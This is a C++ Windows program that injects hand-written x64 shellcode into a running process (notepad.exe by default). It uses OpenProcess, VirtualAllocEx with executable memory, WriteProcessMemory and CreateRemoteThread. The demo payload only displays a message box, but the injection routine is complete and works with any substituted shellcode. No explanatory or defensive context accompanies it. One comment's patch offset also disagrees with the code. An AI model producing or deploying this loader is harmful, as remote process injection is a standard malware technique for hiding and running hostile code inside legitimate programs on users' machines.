#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <tlhelp32.h>


unsigned char shellcode[] = {
    /* 00 */ 0x48, 0x83, 0xEC, 0x28,                    // sub  rsp, 28h
    /* 04 */ 0x48, 0x31, 0xC9,                          // xor  rcx, rcx        ; hWnd = NULL
    /* 07 */ 0x48, 0x8D, 0x15, 0x23, 0x00, 0x00, 0x00,  // lea  rdx,[rip+23h]   ; lpText
    /* 0E */ 0x4C, 0x8D, 0x05, 0x3B, 0x00, 0x00, 0x00,  // lea  r8, [rip+3Bh]   ; lpCaption
    /* 15 */ 0x41, 0xB9, 0x00, 0x00, 0x00, 0x00,        // mov  r9d,0          ; MB_OK
    /* 1B */ 0x48, 0x8B, 0x05, 0x07, 0x00, 0x00, 0x00,  // mov  rax,[rip+7]    ; &MessageBoxA
    /* 22 */ 0xFF, 0xD0,                                // call rax
    /* 24 */ 0x48, 0x83, 0xC4, 0x28,                    // add  rsp, 28h
    /* 28 */ 0xC3,                                      // ret
    /* 29 */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,   // QWORD &MessageBoxA
    /* 31 */ 'H','e','l','l','o',' ','f','r','o','m',' ',
             'i','n','j','e','c','t','e','d',' ',
             's','h','e','l','l','c','o','d','e','!','\0',
             /* 50 */ 'I','n','j','e','c','t','e','d','\0'
};




// Helper: Find process ID by name
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W entry = { sizeof(PROCESSENTRY32W) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    std::wstring targetProcess = L"notepad.exe"; // Change as needed

    DWORD pid = FindProcessId(targetProcess);
    if (!pid) {
        std::wcerr << L"Could not find process: " << targetProcess << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    // Patch the MessageBoxA address in the shellcode
	LoadLibraryA("user32.dll"); // Ensure user32.dll is loaded
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        std::cerr << "Failed to get MessageBoxA address" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    // Patch address at offset 0x2A (see shellcode above)
    *reinterpret_cast<void**>(shellcode + 0x29) = pMessageBoxA;

    // Allocate memory in the target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }


	// Patch the shellcode with the actual address of MessageBoxA
    *(uint64_t*)(shellcode + 0x29) = (uint64_t)GetProcAddress(
        GetModuleHandleA("user32.dll"), "MessageBoxA");

    // Write the shellcode to the target process
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), &written) || written != sizeof(shellcode)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Shellcode injected and thread started successfully." << std::endl;

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, 5000);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
